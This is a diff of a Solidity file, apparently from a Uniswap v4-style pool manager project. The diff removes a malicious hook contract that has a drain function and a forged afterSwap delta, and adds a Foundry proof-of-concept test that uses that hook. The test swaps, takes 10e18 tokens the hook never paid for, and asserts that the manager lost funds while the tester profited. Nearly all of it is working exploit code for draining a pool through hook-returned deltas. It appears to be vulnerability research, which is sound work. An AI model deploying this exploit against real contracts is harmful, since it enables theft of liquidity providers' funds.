@@ -1,33 +1,96 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.26;
-import {IHooks} from "../../src/interfaces/IHooks.sol";
-import {Hooks} from "../../src/libraries/Hooks.sol";
-import {PoolKey} from "../../src/types/PoolKey.sol";
-import {BalanceDelta, toBalanceDelta} from "../../src/types/BalanceDelta.sol";
-import {BeforeSwapDelta} from "../../src/types/BeforeSwapDelta.sol";
-import {ModifyLiquidityParams, SwapParams} from "../../src/types/PoolOperation.sol";
-import {IPoolManager} from "../../src/interfaces/IPoolManager.sol";
-import {Currency} from "../../src/types/Currency.sol";
+import "forge-std/Test.sol";
+import {PoolManager} from "../src/PoolManager.sol";
+import {PoolKey} from "../src/types/PoolKey.sol";
+import {Currency} from "../src/types/Currency.sol";
+import {Hooks} from "../src/libraries/Hooks.sol";
+import {TickMath} from "../src/libraries/TickMath.sol";
+import {SwapParams, ModifyLiquidityParams} from "../src/types/PoolOperation.sol";
+import {MaliciousDeltaHook} from "./mocks/MaliciousDeltaHook.sol";
+import {BalanceDelta, BalanceDeltaLibrary} from "../src/types/BalanceDelta.sol";
 
-contract MaliciousDeltaHook is IHooks {
-    IPoolManager public poolManager;
-    Currency public currency1;
-    address public attacker;
-    constructor(address _manager){poolManager=IPoolManager(_manager);}
-    function setCurrency1(Currency _c) external {currency1=_c;}
-    function setAttacker(address _a) external {attacker=_a;}
-    function drain(uint256 amount) external {poolManager.take(currency1, attacker, amount);}
-    function getHookPermissions() public pure returns (Hooks.Permissions memory){
-        return Hooks.Permissions({beforeInitialize:false,afterInitialize:false,beforeAddLiquidity:false,afterAddLiquidity:false,beforeRemoveLiquidity:false,afterRemoveLiquidity:false,beforeSwap:false,afterSwap:true,beforeDonate:false,afterDonate:false,beforeSwapReturnDelta:false,afterSwapReturnDelta:true,afterAddLiquidityReturnDelta:false,afterRemoveLiquidityReturnDelta:false});
+contract Token {
+    mapping(address=>uint) public balanceOf;
+    function mint(address t,uint a) external {balanceOf[t]+=a;}
+    function transfer(address t,uint a) external returns(bool){balanceOf[msg.sender]-=a; balanceOf[t]+=a; return true;}
+    function transferFrom(address f,address t,uint a) external returns(bool){balanceOf[f]-=a; balanceOf[t]+=a; return true;}
+    function approve(address,uint) external pure returns(bool){return true;}
+}
+
+contract POC is Test {
+    using BalanceDeltaLibrary for BalanceDelta;
+    PoolManager public manager;
+    MaliciousDeltaHook public hook;
+    Token public token0; Token public token1;
+    PoolKey public key;
+    bool isAddingLiquidity;
+
+    function setUp() public {
+        Token t0=new Token(); Token t1=new Token();
+        if(address(t0)>address(t1)){Token tmp=t0; t0=t1; t1=tmp;}
+        token0=t0; token1=t1;
+        manager=new PoolManager(address(this));
+        uint160 flags=uint160(Hooks.AFTER_SWAP_FLAG|Hooks.AFTER_SWAP_RETURNS_DELTA_FLAG);
+        address a=address(uint160(0x1000000000000000000000000000000000000000)|flags);
+        vm.etch(a, address(new MaliciousDeltaHook(address(manager))).code);
+        hook=MaliciousDeltaHook(a);
+        token0.mint(address(this),100e18); token1.mint(address(this),100e18);
+        token0.mint(address(manager),100e18); token1.mint(address(manager),100e18);
+        key=PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)),3000,60,hook);
+        hook.setCurrency1(Currency.wrap(address(token1)));
+        hook.setAttacker(address(this));
+        manager.initialize(key, TickMath.getSqrtPriceAtTick(0));
+        isAddingLiquidity=true;
+        manager.unlock("");
+        isAddingLiquidity=false;
     }
-    function beforeInitialize(address,PoolKey calldata,uint160) external pure returns (bytes4){return IHooks.beforeInitialize.selector;}
-    function afterInitialize(address,PoolKey calldata,uint160,int24) external pure returns (bytes4){return IHooks.afterInitialize.selector;}
-    function beforeAddLiquidity(address,PoolKey calldata,ModifyLiquidityParams calldata,bytes calldata) external pure returns (bytes4){return IHooks.beforeAddLiquidity.selector;}
-    function afterAddLiquidity(address,PoolKey calldata,ModifyLiquidityParams calldata,BalanceDelta,BalanceDelta,bytes calldata) external pure returns (bytes4,BalanceDelta){return (IHooks.afterAddLiquidity.selector,toBalanceDelta(0,0));}
-    function beforeRemoveLiquidity(address,PoolKey calldata,ModifyLiquidityParams calldata,bytes calldata) external pure returns (bytes4){return IHooks.beforeRemoveLiquidity.selector;}
-    function afterRemoveLiquidity(address,PoolKey calldata,ModifyLiquidityParams calldata,BalanceDelta,BalanceDelta,bytes calldata) external pure returns (bytes4,BalanceDelta){return (IHooks.afterRemoveLiquidity.selector,toBalanceDelta(0,0));}
-    function beforeSwap(address,PoolKey calldata,SwapParams calldata,bytes calldata) external pure returns (bytes4,BeforeSwapDelta,uint24){return (IHooks.beforeSwap.selector,BeforeSwapDelta.wrap(0),0);}
-    function afterSwap(address,PoolKey calldata,SwapParams calldata,BalanceDelta,bytes calldata) external pure returns (bytes4,int128){return (IHooks.afterSwap.selector,int128(10e18));}
-    function beforeDonate(address,PoolKey calldata,uint256,uint256,bytes calldata) external pure returns (bytes4){return IHooks.beforeDonate.selector;}
-    function afterDonate(address,PoolKey calldata,uint256,uint256,bytes calldata) external pure returns (bytes4){return IHooks.afterDonate.selector;}
+
+    function unlockCallback(bytes calldata) external returns(bytes memory){
+        Currency c0 = Currency.wrap(address(token0));
+        Currency c1 = Currency.wrap(address(token1));
+        if(isAddingLiquidity){
+            (BalanceDelta delta,) = manager.modifyLiquidity(key, ModifyLiquidityParams(-60,60,10e18,0), "");
+            int128 amt0 = delta.amount0();
+            int128 amt1 = delta.amount1();
+            if (amt0 < 0) { manager.sync(c0); token0.transfer(address(manager), uint128(-amt0)); manager.settle(); }
+            if (amt1 < 0) { manager.sync(c1); token1.transfer(address(manager), uint128(-amt1)); manager.settle(); }
+            if (amt0 > 0) manager.take(c0, address(this), uint128(amt0));
+            if (amt1 > 0) manager.take(c1, address(this), uint128(amt1));
+        } else {
+            // swap 0.1e18 token1 for token0
+            BalanceDelta sDelta = manager.swap(key, SwapParams(false,-0.1e18,TickMath.MAX_SQRT_PRICE-1), "");
+            int128 s0 = sDelta.amount0();
+            int128 s1 = sDelta.amount1();
+            console.log("swap amount0");
+            console.logInt(s0);
+            console.log("swap amount1");
+            console.logInt(s1);
+
+            // 1. settle what we owe from swap itself
+            if (s0 < 0) { manager.sync(c0); token0.transfer(address(manager), uint128(-s0)); manager.settle(); }
+            if (s1 < 0) { manager.sync(c1); token1.transfer(address(manager), uint128(-s1)); manager.settle(); }
+            // 2. take what pool owes from swap
+            if (s0 > 0) manager.take(c0, address(this), uint128(s0));
+            if (s1 > 0) manager.take(c1, address(this), uint128(s1));
+
+            // 3. CRITICAL: hook returned 10e18 as afterSwap delta -> take it
+            // This is the exploit. Hook didn't transfer anything but got credit.
+            console.log("taking hook exploit 10e18");
+            manager.take(c1, address(this), 10e18);
+        }
+        return "";
+    }
+
+    function test_afterSwapReturnDelta() public {
+        uint bBefore=token1.balanceOf(address(manager));
+        uint myBefore=token1.balanceOf(address(this));
+        manager.unlock("");
+        uint bAfter=token1.balanceOf(address(manager));
+        uint myAfter=token1.balanceOf(address(this));
+        console.log("Manager Loss",bBefore-bAfter);
+        console.log("My Profit",myAfter-myBefore);
+        assertLt(bAfter,bBefore);
+        assertGe(myAfter-myBefore,10e18);
+    }
 }
